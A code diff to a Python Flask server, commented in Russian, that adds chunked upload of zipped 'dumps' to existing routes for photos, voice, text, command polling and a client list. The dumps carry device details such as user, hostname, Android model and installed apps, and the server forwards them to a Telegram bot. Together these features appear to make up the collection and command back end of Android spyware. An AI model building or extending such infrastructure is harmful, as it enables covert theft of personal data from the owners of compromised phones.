@@ -1,7 +1,10 @@
 """
 server.py — единая точка на render:
   • бот-поллинг в фоне
-  • /config, /commands, /upload, /upload_photo, /upload_voice, /upload_text
+  • /config, /commands
+  • /upload (единым файлом)
+  • /upload_chunked: init → chunk×N → finish (прогресс по кускам)
+  • /upload_photo, /upload_voice, /upload_text
   • данные в /tmp/dumps
 """
 
@@ -9,6 +12,7 @@ import os
 import json
 import time
 import queue
+import uuid
 import zipfile
 import threading
 from pathlib import Path
@@ -37,6 +41,9 @@ API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 DUMPS = Path(os.getenv("DUMPS_DIR", "/tmp/dumps"))
 DUMPS.mkdir(parents=True, exist_ok=True)
 
+UPLOADS = DUMPS / "_chunks"
+UPLOADS.mkdir(parents=True, exist_ok=True)
+
 app = Flask(__name__)
 
 
@@ -54,7 +61,7 @@ def tg(method: str, **kwargs):
 
 def tg_file(method: str, files: dict, data: dict):
     try:
-        return requests.post(f"{API}/{method}", files=files, data=data, timeout=120).json()
+        return requests.post(f"{API}/{method}", files=files, data=data, timeout=180).json()
     except Exception as e:
         print(f"[tg:{method}] {e}")
         return {"ok": False}
@@ -168,7 +175,7 @@ def bot_poll_loop():
 
 
 # ═══════════════════════════════════════
-#  РОУТЫ
+#  РОУТЫ — ОБЩИЕ
 # ═══════════════════════════════════════
 
 @app.route("/config", methods=["GET"])
@@ -191,6 +198,124 @@ def route_commands():
     except queue.Empty:
         return "", 204
 
+
+# ═══════════════════════════════════════
+#  ЧАНКОВАЯ ЗАГРУЗКА (init → chunk×N → finish)
+# ═══════════════════════════════════════
+
+_chunk_sessions: dict[str, dict] = {}
+
+
+@app.route("/upload_chunked/init", methods=["POST"])
+def route_chunk_init():
+    """
+    клиент говорит: собираюсь прислать X байт, вот инфа.
+    сервер создаёт сессию, отдаёт session_id.
+    """
+    total   = int(request.form.get("total", "0"))
+    raw     = request.form.get("info", "{}")
+    tag     = request.form.get("tag", "REPORT")
+    cid     = request.form.get("id", "anon")
+    fname   = request.form.get("filename", "dump.zip")
+
+    try:
+        info = json.loads(raw)
+    except Exception:
+        info = {"raw": raw}
+
+    sid = uuid.uuid4().hex
+    tmp_path = UPLOADS / f"{sid}.part"
+    tmp_path.touch()
+
+    _chunk_sessions[sid] = {
+        "total":    total,
+        "received": 0,
+        "path":     tmp_path,
+        "info":     info,
+        "tag":      tag,
+        "client":   cid,
+        "filename": fname,
+        "started":  time.time(),
+    }
+
+    return jsonify({"ok": True, "sid": sid, "chunk_size": 256 * 1024}), 200
+
+
+@app.route("/upload_chunked/chunk", methods=["POST"])
+def route_chunk_put():
+    sid = request.form.get("sid")
+    sess = _chunk_sessions.get(sid)
+    if not sess:
+        return jsonify({"ok": False, "err": "unknown sid"}), 404
+
+    if "chunk" not in request.files:
+        return jsonify({"ok": False, "err": "no chunk"}), 400
+
+    data = request.files["chunk"].read()
+    with open(sess["path"], "ab") as f:
+        f.write(data)
+
+    sess["received"] += len(data)
+    pct = 0
+    if sess["total"] > 0:
+        pct = int(sess["received"] / sess["total"] * 100)
+
+    return jsonify({
+        "ok": True,
+        "received": sess["received"],
+        "total":    sess["total"],
+        "pct":      pct,
+    }), 200
+
+
+@app.route("/upload_chunked/finish", methods=["POST"])
+def route_chunk_finish():
+    sid = request.form.get("sid")
+    sess = _chunk_sessions.pop(sid, None)
+    if not sess:
+        return jsonify({"ok": False, "err": "unknown sid"}), 404
+
+    zip_path = DUMPS / f"{int(time.time())}_{sess['filename']}"
+    try:
+        sess["path"].rename(zip_path)
+    except Exception:
+        zip_path = sess["path"]
+
+    # распаковка
+    stamp = time.strftime("%Y%m%d_%H%M%S")
+    work  = DUMPS / stamp
+    work.mkdir(parents=True, exist_ok=True)
+    try:
+        with zipfile.ZipFile(zip_path, "r") as z:
+            z.extractall(work / "unpacked")
+    except Exception as e:
+        print(f"[unzip] {e}")
+
+    (work / "meta.json").write_text(
+        json.dumps(sess["info"], ensure_ascii=False, indent=2), encoding="utf-8"
+    )
+
+    info = sess["info"]
+    caption = (
+        f"*[{sess['tag']}] — dump* `{stamp}`\n"
+        f"```\n"
+        f"User:    {info.get('user','-')}\n"
+        f"Host:    {info.get('hostname','-')}\n"
+        f"Model:   {info.get('brand','-')} {info.get('model','-')}\n"
+        f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
+        f"ABI:     {info.get('cpu_abi','-')}\n"
+        f"Apps:    {len(info.get('installed_apps', []))}\n"
+        f"```\n"
+        f"🌐 https://{SERVER_DOMAIN}/health"
+    )
+    tg_send_document(zip_path, caption=caption)
+
+    return jsonify({"ok": True, "stamp": stamp}), 200
+
+
+# ═══════════════════════════════════════
+#  ЗАГРУЗКА ОДНИМ ФАЙЛОМ (старый роут)
+# ═══════════════════════════════════════
 
 @app.route("/upload", methods=["POST"])
 def route_upload():
@@ -231,12 +356,15 @@ def route_upload():
         f"Android: {info.get('android','-')} (sdk {info.get('sdk','-')})\n"
         f"ABI:     {info.get('cpu_abi','-')}\n"
         f"Apps:    {len(info.get('installed_apps', []))}\n"
-        f"```\n"
-        f"🌐 https://{SERVER_DOMAIN}/health"
+        f"```"
     )
     tg_send_document(zip_path, caption=caption)
     return jsonify({"ok": True, "stamp": stamp}), 200
 
+
+# ═══════════════════════════════════════
+#  ПРОЧИЕ ЗАГРУЗКИ
+# ═══════════════════════════════════════
 
 @app.route("/upload_photo", methods=["POST"])
 def route_upload_photo():
@@ -269,6 +397,10 @@ def route_upload_text():
         tg_send_text(f"*[{tag}]*\n{text}")
     return jsonify({"ok": True}), 200
 
+
+# ═══════════════════════════════════════
+#  МЕТА-РОУТЫ
+# ═══════════════════════════════════════
 
 @app.route("/clients", methods=["GET"])
 def route_clients():
